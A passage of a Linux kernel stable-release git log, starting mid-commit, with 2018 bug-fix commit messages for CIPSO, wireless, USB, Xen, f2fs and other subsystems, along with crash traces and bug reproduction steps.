commit 40413955ee26 ("Cipso: cipso\_v4\_optptr enter infinite loop") fixed
a possible infinite loop in the IP option parsing of CIPSO. The fix
assumes that ip\_options\_compile filtered out all zero length options and
that no other one-byte options beside IPOPT\_END and IPOPT\_NOOP exist.
While this assumption currently holds true, add explicit checks for zero
length and invalid length options to be safe for the future. Even though
ip\_options\_compile should have validated the options, the introduction of
new one-byte options can still confuse this code without the additional
checks.
Signed-off-by: Stefan Nuernberger
Cc: David Woodhouse
Cc: Simon Veith
Cc: stable@vger.kernel.org
Acked-by: Paul Moore
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 3fa2721424654eae32d14a8374420aa17a0c1255
Author: Luca Coelho
Date: Sat Oct 13 09:46:08 2018 +0300
iwlwifi: mvm: check return value of rs\_rate\_from\_ucode\_rate()
commit 3d71c3f1f50cf309bd20659422af549bc784bfff upstream.
The rs\_rate\_from\_ucode\_rate() function may return -EINVAL if the rate
is invalid, but none of the callsites check for the error, potentially
making us access arrays with index IWL\_RATE\_INVALID, which is larger
than the arrays, causing an out-of-bounds access. This will trigger
KASAN warnings, such as the one reported in the bugzilla issue
mentioned below.
This fixes https://bugzilla.kernel.org/show\_bug.cgi?id=200659
Cc: stable@vger.kernel.org
Signed-off-by: Luca Coelho
Signed-off-by: Kalle Valo
Signed-off-by: Greg Kroah-Hartman
commit 77f61e7043bfd7ee5ef954383591b3ae544988b0
Author: Felix Fietkau
Date: Mon Oct 1 13:24:00 2018 +0200
mt76: mt76x2: fix multi-interface beacon configuration
commit 5289976ad887deb07c76df7eecf553c264aeebed upstream.
If the first virtual interface is a station (or an AP with beacons
temporarily disabled), the beacon of the second interface needs to
occupy hardware beacon slot 0.
For some reason the beacon index was incorrectly masked with the
virtual interface beacon mask, which prevents the secondary
interface from sending beacons unless the first one also does.
Cc: stable@vger.kernel.org
Signed-off-by: Felix Fietkau
Signed-off-by: Greg Kroah-Hartman
commit 11abbcd397a4688f020397e9dd978303370004dc
Author: Yoshihiro Shimoda
Date: Tue Oct 2 20:57:44 2018 +0900
usb: gadget: udc: renesas\_usb3: Fix b-device mode for "workaround"
commit afc92514a34c7414b28047b1205a6b709103c699 upstream.
If the "workaround\_for\_vbus" is true, the driver will not call
usb\_disconnect(). So, since the controller keeps some registers'
value, the driver doesn't re-enumarate suitable speed after
the b-device mode is disabled. To fix the issue, this patch
adds usb\_disconnect() calling in renesas\_usb3\_b\_device\_write()
if workaround\_for\_vbus is true.
Fixes: 43ba968b00ea ("usb: gadget: udc: renesas\_usb3: add debugfs to set the b-device mode")
Cc:  # v4.14+
Signed-off-by: Yoshihiro Shimoda
Signed-off-by: Felipe Balbi
Signed-off-by: Greg Kroah-Hartman
commit 512307dd4f0976fa83d7cf576d10c426869bb3f5
Author: Adam Thomson
Date: Fri Sep 21 16:04:11 2018 +0100
usb: typec: tcpm: Fix APDO PPS order checking to be based on voltage
commit 1b6af2f58c2b1522e0804b150ca95e50a9e80ea7 upstream.
Current code mistakenly checks against max current to determine
order but this should be max voltage. This commit fixes the issue
so order is correctly determined, thus avoiding failure based on
a higher voltage PPS APDO having a lower maximum current output,
which is actually valid.
Fixes: 2eadc33f40d4 ("typec: tcpm: Add core support for sink side PPS")
Cc:
Signed-off-by: Adam Thomson
Reviewed-by: Heikki Krogerus
Reviewed-by: Guenter Roeck
Signed-off-by: Greg Kroah-Hartman
commit 08c7103daa0d2da9b693a9fddf139ba33d0de886
Author: Shuah Khan (Samsung OSG)
Date: Thu Oct 18 10:19:29 2018 -0600
usbip:vudc: BUG kmalloc-2048 (Not tainted): Poison overwritten
commit e28fd56ad5273be67d0fae5bedc7e1680e729952 upstream.
In rmmod path, usbip\_vudc does platform\_device\_put() twice once from
platform\_device\_unregister() and then from put\_vudc\_device().
The second put results in:
BUG kmalloc-2048 (Not tainted): Poison overwritten error or
BUG: KASAN: use-after-free in kobject\_put+0x1e/0x230 if KASAN is
enabled.
[ 169.042156] calling init+0x0/0x1000 [usbip\_vudc] @ 1697
[ 169.042396] =============================================================================
[ 169.043678] probe of usbip-vudc.0 returned 1 after 350 usecs
[ 169.044508] BUG kmalloc-2048 (Not tainted): Poison overwritten
[ 169.044509] -----------------------------------------------------------------------------
...
[ 169.057849] INFO: Freed in device\_release+0x2b/0x80 age=4223 cpu=3 pid=1693
[ 169.057852] kobject\_put+0x86/0x1b0
[ 169.057853] 0xffffffffc0c30a96
[ 169.057855] \_\_x64\_sys\_delete\_module+0x157/0x240
Fix it to call platform\_device\_del() instead and let put\_vudc\_device() do
the platform\_device\_put().
Reported-by: Randy Dunlap
Signed-off-by: Shuah Khan (Samsung OSG)
Cc:
Signed-off-by: Greg Kroah-Hartman
commit f253f6def4bc2c01d1a2b2f7c5ec82b8d18ba53d
Author: Lubomir Rintel
Date: Sat Oct 6 22:12:32 2018 +0200
libertas: don't set URB\_ZERO\_PACKET on IN USB transfer
commit 6528d88047801b80d2a5370ad46fb6eff2f509e0 upstream.
The USB core gets rightfully upset:
usb 1-1: BOGUS urb flags, 240 --> 200
WARNING: CPU: 0 PID: 60 at drivers/usb/core/urb.c:503 usb\_submit\_urb+0x2f8/0x3ed
Modules linked in:
CPU: 0 PID: 60 Comm: kworker/0:3 Not tainted 4.19.0-rc6-00319-g5206d00a45c7 #39
Hardware name: OLPC XO/XO, BIOS OLPC Ver 1.00.01 06/11/2014
Workqueue: events request\_firmware\_work\_func
EIP: usb\_submit\_urb+0x2f8/0x3ed
Code: 75 06 8b 8f 80 00 00 00 8d 47 78 89 4d e4 89 55 e8 e8 35 1c f6 ff 8b 55 e8 56 52 8b 4d e4 51 50 68 e3 ce c7 c0 e8 ed 18 c6 ff <0f> 0b 83 c4 14 80 7d ef 01 74 0a 80 7d ef 03 0f 85 b8 00 00 00 8b
EAX: 00000025 EBX: ce7d4980 ECX: 00000000 EDX: 00000001
ESI: 00000200 EDI: ce7d8800 EBP: ce7f5ea8 ESP: ce7f5e70
DS: 007b ES: 007b FS: 0000 GS: 00e0 SS: 0068 EFLAGS: 00210292
CR0: 80050033 CR2: 00000000 CR3: 00e80000 CR4: 00000090
Call Trace:
? if\_usb\_fw\_timeo+0x64/0x64
\_\_if\_usb\_submit\_rx\_urb+0x85/0xe6
? if\_usb\_fw\_timeo+0x64/0x64
if\_usb\_submit\_rx\_urb\_fwload+0xd/0xf
if\_usb\_prog\_firmware+0xc0/0x3db
? \_request\_firmware+0x54/0x47b
? \_request\_firmware+0x89/0x47b
? if\_usb\_probe+0x412/0x412
lbs\_fw\_loaded+0x55/0xa6
? debug\_smp\_processor\_id+0x12/0x14
helper\_firmware\_cb+0x3c/0x3f
request\_firmware\_work\_func+0x37/0x6f
process\_one\_work+0x164/0x25a
worker\_thread+0x1c4/0x284
kthread+0xec/0xf1
? cancel\_delayed\_work\_sync+0xf/0xf
? kthread\_create\_on\_node+0x1a/0x1a
ret\_from\_fork+0x2e/0x38
---[ end trace 3ef1e3b2dd53852f ]---
Cc: stable@vger.kernel.org
Signed-off-by: Lubomir Rintel
Signed-off-by: Kalle Valo
Signed-off-by: Greg Kroah-Hartman
commit c43c81bef7d4c9150514b80af4a233f0cb6e60b0
Author: Juergen Gross
Date: Thu Oct 25 09:54:15 2018 +0200
xen/pvh: don't try to unplug emulated devices
commit e6111161c0a02d58919d776eec94b313bb57911f upstream.
A Xen PVH guest has no associated qemu device model, so trying to
unplug any emulated devices is making no sense at all.
Bail out early from xen\_unplug\_emulated\_devices() when running as PVH
guest. This will avoid issuing the boot message:
[ 0.000000] Xen Platform PCI: unrecognised magic value
Cc:  # 4.11
Signed-off-by: Juergen Gross
Reviewed-by: Boris Ostrovsky
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit 82f76b056d01fb3bd936278ddd253f58ef3155e5
Author: Roger Pau Monne
Date: Tue Oct 9 12:32:37 2018 +0200
xen/pvh: increase early stack size
commit 7deecbda3026f5e2a8cc095d7ef7261a920efcf2 upstream.
While booting on an AMD EPYC box the stack canary would detect stack
overflows when using the current PVH early stack size (256). Switch to
using the value defined by BOOT\_STACK\_SIZE, which prevents the stack
overflow.
Cc:  # 4.11
Signed-off-by: Roger Pau Monné
Reviewed-by: Juergen Gross
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit 99d255861e288b40cb88d0a186ea1b22d9e1eddf
Author: Juergen Gross
Date: Mon Oct 1 07:57:42 2018 +0200
xen: make xen\_qlock\_wait() nestable
commit a856531951dc8094359dfdac21d59cee5969c18e upstream.
xen\_qlock\_wait() isn't safe for nested calls due to interrupts. A call
of xen\_qlock\_kick() might be ignored in case a deeper nesting level
was active right before the call of xen\_poll\_irq():
CPU 1: CPU 2:
spin\_lock(lock1)
spin\_lock(lock1)
-> xen\_qlock\_wait()
-> xen\_clear\_irq\_pending()
Interrupt happens
spin\_unlock(lock1)
-> xen\_qlock\_kick(CPU 2)
spin\_lock\_irqsave(lock2)
spin\_lock\_irqsave(lock2)
-> xen\_qlock\_wait()
-> xen\_clear\_irq\_pending()
clears kick for lock1
-> xen\_poll\_irq()
spin\_unlock\_irq\_restore(lock2)
-> xen\_qlock\_kick(CPU 2)
wakes up
spin\_unlock\_irq\_restore(lock2)
IRET
resumes in xen\_qlock\_wait()
-> xen\_poll\_irq()
never wakes up
The solution is to disable interrupts in xen\_qlock\_wait() and not to
poll for the irq in case xen\_qlock\_wait() is called in nmi context.
Cc: stable@vger.kernel.org
Cc: Waiman.Long@hp.com
Cc: peterz@infradead.org
Signed-off-by: Juergen Gross
Reviewed-by: Jan Beulich
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit 9dc8cf0df2cde550b7bad97bf696c087bb39f207
Author: Juergen Gross
Date: Mon Oct 1 07:57:42 2018 +0200
xen: fix race in xen\_qlock\_wait()
commit 2ac2a7d4d9ff4e01e36f9c3d116582f6f655ab47 upstream.
In the following situation a vcpu waiting for a lock might not be
woken up from xen\_poll\_irq():
CPU 1: CPU 2: CPU 3:
takes a spinlock
tries to get lock
-> xen\_qlock\_wait()
frees the lock
-> xen\_qlock\_kick(cpu2)
-> xen\_clear\_irq\_pending()
takes lock again
tries to get lock
-> \*lock = \_Q\_SLOW\_VAL
-> \*lock == \_Q\_SLOW\_VAL ?
-> xen\_poll\_irq()
frees the lock
-> xen\_qlock\_kick(cpu3)
And cpu 2 will sleep forever.
This can be avoided easily by modifying xen\_qlock\_wait() to call
xen\_poll\_irq() only if the related irq was not pending and to call
xen\_clear\_irq\_pending() only if it was pending.
Cc: stable@vger.kernel.org
Cc: Waiman.Long@hp.com
Cc: peterz@infradead.org
Signed-off-by: Juergen Gross
Reviewed-by: Jan Beulich
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit a3e7530f44c03b4fc43ba6a0c26e07c711a0b20a
Author: Boris Ostrovsky
Date: Sun Oct 7 16:05:38 2018 -0400
xen/balloon: Support xend-based toolstack
commit 3aa6c19d2f38be9c6e9a8ad5fa8e3c9d29ee3c35 upstream.
Xend-based toolstacks don't have static-max entry in xenstore. The
equivalent node for those toolstacks is memory\_static\_max.
Fixes: 5266b8e4445c (xen: fix booting ballooned down hvm guest)
Signed-off-by: Boris Ostrovsky
Cc:  # 4.13
Reviewed-by: Juergen Gross
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit f6a2cd180adb0c32efbaecf56dfe27e9e7a40360
Author: Vasilis Liaskovitis
Date: Mon Oct 15 15:25:08 2018 +0200
xen/blkfront: avoid NULL blkfront\_info dereference on device removal
commit f92898e7f32e3533bfd95be174044bc349d416ca upstream.
If a block device is hot-added when we are out of grants,
gnttab\_grant\_foreign\_access fails with -ENOSPC (log message "28
granting access to ring page") in this code path:
talk\_to\_blkback ->
setup\_blkring ->
xenbus\_grant\_ring ->
gnttab\_grant\_foreign\_access
and the failing path in talk\_to\_blkback sets the driver\_data to NULL:
destroy\_blkring:
blkif\_free(info, 0);
mutex\_lock(&blkfront\_mutex);
free\_info(info);
mutex\_unlock(&blkfront\_mutex);
dev\_set\_drvdata(&dev->dev, NULL);
This results in a NULL pointer BUG when blkfront\_remove and blkif\_free
try to access the failing device's NULL struct blkfront\_info.
Cc: stable@vger.kernel.org # 4.5 and later
Signed-off-by: Vasilis Liaskovitis
Reviewed-by: Roger Pau Monné
Signed-off-by: Konrad Rzeszutek Wilk
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 4eab852bf259b95c05b5f979e675daf15473ffa4
Author: Dr. Greg Wettstein
Date: Mon Sep 17 18:53:33 2018 -0400
tpm: Restore functionality to xen vtpm driver.
commit e487a0f52301293152a6f8c4e217f2a11dd808e3 upstream.
Functionality of the xen-tpmfront driver was lost secondary to
the introduction of xenbus multi-page support in commit ccc9d90a9a8b
("xenbus\_client: Extend interface to support multi-page ring").
In this commit pointer to location of where the shared page address
is stored was being passed to the xenbus\_grant\_ring() function rather
then the address of the shared page itself. This resulted in a situation
where the driver would attach to the vtpm-stubdom but any attempt
to send a command to the stub domain would timeout.
A diagnostic finding for this regression is the following error
message being generated when the xen-tpmfront driver probes for a
device:
<3>vtpm vtpm-0: tpm\_transmit: tpm\_send: error -62
<3>vtpm vtpm-0: A TPM error (-62) occurred attempting to determine
the timeouts
This fix is relevant to all kernels from 4.1 forward which is the
release in which multi-page xenbus support was introduced.
Daniel De Graaf formulated the fix by code inspection after the
regression point was located.
Fixes: ccc9d90a9a8b ("xenbus\_client: Extend interface to support multi-page ring")
Signed-off-by: Dr. Greg Wettstein
Signed-off-by: Greg Kroah-Hartman
[boris: Updated commit message, added Fixes tag]
Signed-off-by: Boris Ostrovsky
Cc: stable@vger.kernel.org # v4.1+
Reviewed-by: Jarkko Sakkinen
Signed-off-by: Jarkko Sakkinen
commit 73afce2ebf7e9202167b5df94e6db4cd1a2b9b4d
Author: Joe Jin
Date: Tue Oct 16 15:21:16 2018 -0700
xen-swiotlb: use actually allocated size on check physical continuous
commit 7250f422da0480d8512b756640f131b9b893ccda upstream.
xen\_swiotlb\_{alloc,free}\_coherent() allocate/free memory based on the
order of the pages and not size argument (bytes). This is inconsistent with
range\_straddles\_page\_boundary and memset which use the 'size' value,
which may lead to not exchanging memory with Xen (range\_straddles\_page\_boundary()
returned true). And then the call to xen\_swiotlb\_free\_coherent() would
actually try to exchange the memory with Xen, leading to the kernel
hitting an BUG (as the hypercall returned an error).
This patch fixes it by making the 'size' variable be of the same size
as the amount of memory allocated.
CC: stable@vger.kernel.org
Signed-off-by: Joe Jin
Cc: Konrad Rzeszutek Wilk
Cc: Boris Ostrovsky
Cc: Christoph Helwig
Cc: Dongli Zhang
Cc: John Sobecki
Signed-off-by: Konrad Rzeszutek Wilk
Signed-off-by: Greg Kroah-Hartman
commit 086bdad87287d3fd32f9bd791ce9e01454c89706
Author: Marek Szyprowski
Date: Tue Aug 7 12:48:49 2018 +0200
ARM: dts: exynos: Mark 1 GHz CPU OPP as suspend OPP on Exynos5250
commit 645b23da6f8b47f295fa87051335d41d139717a5 upstream.
1 GHz CPU OPP is the default boot value for the Exynos5250 SOC, so mark it
as suspend OPP. This fixes suspend/resume on Samsung Exynos5250 Snow
Chomebook, which was broken since switching to generic cpufreq-dt driver
in v4.3.
Cc:  # 4.3.x: cd6f55457eb4: ARM: dts: exynos: Remove "cooling-{min|max}-level" for CPU nodes
Cc:  # 4.3.x: 672f33198bee: arm: dts: exynos: Add missing cooling device properties for CPUs
Cc:  # 4.3.x
Signed-off-by: Marek Szyprowski
Reviewed-by: Chanwoo Choi
Acked-by: Bartlomiej Zolnierkiewicz
Signed-off-by: Krzysztof Kozlowski
Signed-off-by: Greg Kroah-Hartman
commit 9526bcfdba7f6114579e5747a91c4f8a20b55340
Author: Marek Szyprowski
Date: Tue Aug 7 12:48:48 2018 +0200
ARM: dts: exynos: Convert exynos5250.dtsi to opp-v2 bindings
commit eb9e16d8573e243f8175647f851eb5085dbe97a4 upstream.
Convert Exynos5250 to OPP-v2 bindings. This is a preparation to add proper
support for suspend operation point, which cannot be marked in opp-v1.
Cc:  # 4.3.x: cd6f55457eb4: ARM: dts: exynos: Remove "cooling-{min|max}-level" for CPU nodes
Cc:  # 4.3.x: 672f33198bee: arm: dts: exynos: Add missing cooling device properties for CPUs
Cc:  # 4.3.x
Signed-off-by: Marek Szyprowski
Reviewed-by: Chanwoo Choi
Acked-by: Bartlomiej Zolnierkiewicz
Signed-off-by: Krzysztof Kozlowski
Signed-off-by: Greg Kroah-Hartman
commit ed6fea0059e57b40331280333fd7c682e3f370a0
Author: Viresh Kumar
Date: Tue Sep 11 11:14:34 2018 +0530
OPP: Free OPP table properly on performance state irregularities
commit 2fbb8670b4ff4454f1c0de510f788d737edc4b90 upstream.
The OPP table was freed, but not the individual OPPs which is done from
\_dev\_pm\_opp\_remove\_table(). Fix it by calling \_dev\_pm\_opp\_remove\_table()
as well.
Cc: 4.18  # v4.18
Fixes: 3ba98324e81a ("PM / OPP: Get performance state using genpd helper")
Tested-by: Niklas Cassel
Signed-off-by: Viresh Kumar
Signed-off-by: Greg Kroah-Hartman
commit 5cfb4a68693d9dd335934032a6ffbf241b33b3bb
Author: Chao Yu
Date: Mon Oct 22 09:12:51 2018 +0800
f2fs: fix to account IO correctly
commit 4c58ed076875f36dae0f240da1e25e99e5d4afb8 upstream.
Below race can cause reversed reference on dirty count, fix it by
relocating \_\_submit\_bio() and inc\_page\_count().
Thread A Thread B
- f2fs\_inplace\_write\_data
- f2fs\_submit\_page\_bio
- \_\_submit\_bio
- f2fs\_write\_end\_io
- dec\_page\_count
- inc\_page\_count
Cc:
Fixes: d1b3e72d5490 ("f2fs: submit bio of in-place-update pages")
Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Greg Kroah-Hartman
commit 56db43fd8c9f7f3704071c938dc17441d9c30e88
Author: Chao Yu
Date: Wed Oct 3 22:32:44 2018 +0800
f2fs: fix to recover cold bit of inode block during POR
commit ef2a007134b4eaa39264c885999f296577bc87d2 upstream.
Testcase to reproduce this bug:
1. mkfs.f2fs /dev/sdd
2. mount -t f2fs /dev/sdd /mnt/f2fs
3. touch /mnt/f2fs/file
4. sync
5. chattr +A /mnt/f2fs/file
6. xfs\_io -f /mnt/f2fs/file -c "fsync"
7. godown /mnt/f2fs
8. umount /mnt/f2fs
9. mount -t f2fs /dev/sdd /mnt/f2fs
10. chattr -A /mnt/f2fs/file
11. xfs\_io -f /mnt/f2fs/file -c "fsync"
12. umount /mnt/f2fs
13. mount -t f2fs /dev/sdd /mnt/f2fs
14. lsattr /mnt/f2fs/file
-----------------N- /mnt/f2fs/file
But actually, we expect the corrct result is:
-------A---------N- /mnt/f2fs/file
The reason is in step 9) we missed to recover cold bit flag in inode
block, so later, in fsync, we will skip write inode block due to below
condition check, result in lossing data in another SPOR.
f2fs\_fsync\_node\_pages()
if (!IS\_DNODE(page) || !is\_cold\_node(page))
continue;
Note that, I guess that some non-dir inode has already lost cold bit
during POR, so in order to reenable recovery for those inode, let's
try to recover cold bit in f2fs\_iget() to save more fsynced data.
Fixes: c56675750d7c ("f2fs: remove unneeded set\_cold\_node()")
Cc:  4.17+
Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Greg Kroah-Hartman
commit d224115ac1229d4a74dd023703dd024ff2c6a383
Author: Jaegeuk Kim
Date: Thu Sep 27 22:15:31 2018 -0700
f2fs: fix missing up\_read
commit 89d13c38501df730cbb2e02c4499da1b5187119d upstream.
This patch fixes missing up\_read call.
Fixes: c9b60788fc76 ("f2fs: fix to do sanity check with block address in main area")
Cc:  # 4.19+
Reviewed-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Greg Kroah-Hartman
commit 4561194f4c4cde3c37e90216b408cc4ffc3901dd
Author: Jaegeuk Kim
Date: Tue Oct 16 19:30:13 2018 -0700
Revert "f2fs: fix to clear PG\_checked flag in set\_page\_dirty()"
commit 164a63fa6b384e30ceb96ed80bc7dc3379bc0960 upstream.
This reverts commit 66110abc4c931f879d70e83e1281f891699364bf.
If we clear the cold data flag out of the writeback flow, we can miscount
-1 by end\_io, which incurs a deadlock caused by all I/Os being blocked during
heavy GC.
Balancing F2FS Async:
- IO (CP: 1, Data: -1, Flush: ( 0 0 1), Discard: ( ...
GC thread: IRQ
- move\_data\_page()
- set\_page\_dirty()
- clear\_cold\_data()
- f2fs\_write\_end\_io()
- type = WB\_DATA\_TYPE(page);
here, we get wrong type
- dec\_page\_count(sbi, type);
- f2fs\_wait\_on\_page\_writeback()
Cc:
Reported-and-Tested-by: Park Ju Hyung
Reviewed-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Greg Kroah-Hartman
commit 12b00f1e518ca9f2a2247ac31da1b5e7c6da4064
Author: Prarit Bhargava
Date: Mon Oct 8 11:06:18 2018 -0400
cpupower: Fix AMD Family 0x17 msr\_pstate size
[ Upstream commit 8c22e2f695920ebd94f9a53bcf2a65eb36d4dba1 ]
The msr\_pstate data is only 63 bits long and should be 64 bits.
Add in the missing bit from res1 for AMD Family 0x17.
Reference: https://www.amd.com/system/files/TechDocs/54945\_PPR\_Family\_17h\_Models\_00h-0Fh.pdf, page 138.
Signed-off-by: Prarit Bhargava
Cc: Shuah Khan
Cc: Stafford Horne
Signed-off-by: Shuah Khan (Samsung OSG)
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 60fa88f6713a5d251971a9a425a12feec12376bf
Author: Takashi Iwai
Date: Sat Aug 11 23:33:34 2018 +0200
ALSA: hda: Check the non-cached stream buffers more explicitly
[ Upstream commit 78c9be61c3a5cd9e2439fd27a5ffad73a81958c7 ]
Introduce a new flag, uc\_buffer, to indicate that the controller
requires the non-cached pages for stream buffers, either as a
chip-specific requirement or specified via snoop=0 option.
This improves the code-readability.
Also, this patch fixes the incorrect behavior for C-Media chip where
the stream buffers were never handled as non-cached due to the check
of driver\_type even if you pass snoop=0 option.
Signed-off-by: Takashi Iwai
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9dd0fafb5a7ab2ad7911d426e22757a2c6aecc11
Author: Vijay Immanuel
Date: Tue Jun 12 18:20:49 2018 -0700
IB/rxe: fix for duplicate request processing and ack psns
[ Upstream commit b97db58557f4aa6d9903f8e1deea6b3d1ed0ba43 ]
Don't reset the resp opcode for a replayed read response.
The resp opcode could be in the middle of a write or send
sequence, when the duplicate read request was received.
An example sequence is as follows:
- Receive read request for 12KB PSN 20. Transmit read response
first, middle and last with PSNs 20,21,22.
- Receive write first PSN 23.
At this point the resp psn is 24 and resp opcode is write first.
- The sender notices that PSN 20 is dropped and retransmits.
Receive read request for 12KB PSN 20. Transmit read response
first, middle and last with PSNs 20,21,22. The resp opcode is
set to -1, the resp psn remains 24.
- Receive write first PSN 23. This is processed by duplicate\_request().
The resp opcode remains -1 and resp psn remains 24.
- Receive write middle PSN 24. check\_op\_seq() reports a missing
first error since the resp opcode is -1.
When sending an ack for a duplicate send or write request,
use the psn of the previous ack sent. Do not use the psn
of a read response for the ack.
An example sequence is as follows:
- Receive write PSN 30. Transmit ACK for PSN 30.
- Receive read request 4KB PSN 31. Transmit read response with
PSN 31. The resp psn is now 32.
- The sender notices that PSN 30 is dropped and retransmits.
Receive write PSN 30. duplicate\_request() sends an ACK with
PSN 31. That is incorrect since PSN 31 was a read request.
Signed-off-by: Vijay Immanuel
Signed-off-by: Doug Ledford
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 71e124bd39907940c060b724ec4747edca140ec7
Author: Paul Cercueil
Date: Wed Aug 29 23:32:44 2018 +0200
dmaengine: dma-jz4780: Return error if not probed from DT
[ Upstream commit 54f919a04cf221bc1601d1193682d4379dacacbd ]
The driver calls clk\_get() with the clock name set to NULL, which means
that the driver could only work when probed from devicetree. From now
on, we explicitly require the driver to be probed from devicetree.
Signed-off-by: Paul Cercueil
Tested-by: Mathieu Malaterre
Signed-off-by: Vinod Koul
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 128b1b38a6bf30e8444f8af76729502528e00895
Author: Alexandre Belloni
Date: Sun Sep 9 22:48:58 2018 +0200
mfd: menelaus: Fix possible race condition and leak
[ Upstream commit 9612f8f503804d2fd2f63aa6ba1e58bba4612d96 ]
The IRQ work is added before the struct rtc is allocated and registered,
but this struct is used in the IRQ handler. This may lead to a NULL pointer
dereference.
Switch to devm\_rtc\_allocate\_device/rtc\_register\_device to allocate the rtc
before calling menelaus\_add\_irq\_work.
Also, this solves a possible leak as the RTC is never released.
Signed-off-by: Alexandre Belloni
Signed-off-by: Lee Jones
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit cd295fddbe5168a9fd0ebfbbc2e02f7e2f6c81f1
Author: Chao Yu
Date: Wed Aug 22 17:11:05 2018 +0800
f2fs: fix to flush all dirty inodes recovered in readonly fs
[ Upstream commit 1378752b9921e60749eaf18ec6c47b33f9001abb ]
generic/417 reported as blow:
------------[ cut here ]------------
kernel BUG at /home/yuchao/git/devf2fs/inode.c:695!
invalid opcode: 0000 [#1] PREEMPT SMP
CPU: 1 PID: 21697 Comm: umount Tainted: G W O 4.18.0-rc2+ #39
Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006
EIP: f2fs\_evict\_inode+0x556/0x580 [f2fs]
Call Trace:
? \_raw\_spin\_unlock+0x2c/0x50
evict+0xa8/0x170
dispose\_list+0x34/0x40
evict\_inodes+0x118/0x120
generic\_shutdown\_super+0x41/0x100
? rcu\_read\_lock\_sched\_held+0x97/0xa0
kill\_block\_super+0x22/0x50
kill\_f2fs\_super+0x6f/0x80 [f2fs]
deactivate\_locked\_super+0x3d/0x70
deactivate\_super+0x40/0x60
cleanup\_mnt+0x39/0x70
\_\_cleanup\_mnt+0x10/0x20
task\_work\_run+0x81/0xa0
exit\_to\_usermode\_loop+0x59/0xa7
do\_fast\_syscall\_32+0x1f5/0x22c
entry\_SYSENTER\_32+0x53/0x86
EIP: f2fs\_evict\_inode+0x556/0x580 [f2fs]
It can simply reproduced with scripts:
Enable quota feature during mkfs.
Testcase1:
1. mkfs.f2fs /dev/zram0
2. mount -t f2fs /dev/zram0 /mnt/f2fs
3. xfs\_io -f /mnt/f2fs/file -c "pwrite 0 4k" -c "fsync"
4. godown /mnt/f2fs
5. umount /mnt/f2fs
6. mount -t f2fs -o ro /dev/zram0 /mnt/f2fs
7. umount /mnt/f2fs
Testcase2:
1. mkfs.f2fs /dev/zram0
2. mount -t f2fs /dev/zram0 /mnt/f2fs
3. touch /mnt/f2fs/file
4. create process[pid = x] do:
a) open /mnt/f2fs/file;
b) unlink /mnt/f2fs/file
5. godown -f /mnt/f2fs
6. kill process[pid = x]
7. umount /mnt/f2fs
8. mount -t f2fs -o ro /dev/zram0 /mnt/f2fs
9. umount /mnt/f2fs
The reason is: during recovery, i\_{c,m}time of inode will be updated, then
the inode can be set dirty w/o being tracked in sbi->inode\_list[DIRTY\_META]
global list, so later write\_checkpoint will not flush such dirty inode into
node page.
Once umount is called, sync\_filesystem() in generic\_shutdown\_super() will
skip syncng dirty inodes due to sb\_rdonly check, leaving dirty inodes
there.
To solve this issue, during umount, add remove SB\_RDONLY flag in
sb->s\_flags, to make sure sync\_filesystem() will not be skipped.
Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit cd0852081d74fbd38f3098bb030c6e6c60e21c04
Author: Eric W. Biederman
Date: Mon Sep 3 20:02:46 2018 +0200
signal: Always deliver the kernel's SIGKILL and SIGSTOP to a pid namespace init
[ Upstream commit 3597dfe01d12f570bc739da67f857fd222a3ea66 ]
Instead of playing whack-a-mole and changing SEND\_SIG\_PRIV to
SEND\_SIG\_FORCED throughout the kernel to ensure a pid namespace init
gets signals sent by the kernel, stop allowing a pid namespace init to
ignore SIGKILL or SIGSTOP sent by the kernel. A pid namespace init is
only supposed to be able to ignore signals sent from itself and
children with SIG\_DFL.
Fixes: 921cf9f63089 ("signals: protect cinit from unblocked SIG\_DFL signals")
Reviewed-by: Thomas Gleixner
Signed-off-by: "Eric W. Biederman"
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit cfc8a57a67fbbcd123d61fec7713cdf1b9b45a26
Author: Yunlei He
Date: Tue Jun 26 13:12:43 2018 +0800
f2fs: report error if quota off error during umount
[ Upstream commit cda9cc595f0bb6ffa51a4efc4b6533dfa4039b4c ]
Now, we depend on fsck to ensure quota file data is ok,
so we scan whole partition if checkpoint without umount
flag. It's same for quota off error case, which may make
quota file data inconsistent.
generic/019 reports below error:
\_\_quota\_error: 1160 callbacks suppressed
Quota error (device zram1): write\_blk: dquota write failed
Quota error (device zram1): qtree\_write\_dquot: Error -28 occurred while creating quota
Quota error (device zram1): write\_blk: dquota write failed
Quota error (device zram1): qtree\_write\_dquot: Error -28 occurred while creating quota
Quota error (device zram1): write\_blk: dquota write failed
Quota error (device zram1): qtree\_write\_dquot: Error -28 occurred while creating quota
Quota error (device zram1): write\_blk: dquota write failed
Quota error (device zram1): qtree\_write\_dquot: Error -28 occurred while creating quota
Quota error (device zram1): write\_blk: dquota write failed
Quota error (device zram1): qtree\_write\_dquot: Error -28 occurred while creating quota
VFS: Busy inodes after unmount of zram1. Self-destruct in 5 seconds. Have a nice day...
If we failed in below path due to fail to write dquot block, we will miss
to release quota inode, fix it.
- f2fs\_put\_super
- f2fs\_quota\_off\_umount
- f2fs\_quota\_off
- f2fs\_quota\_sync <-- failed
- dquot\_quota\_off <-- missed to call
Signed-off-by: Yunlei He
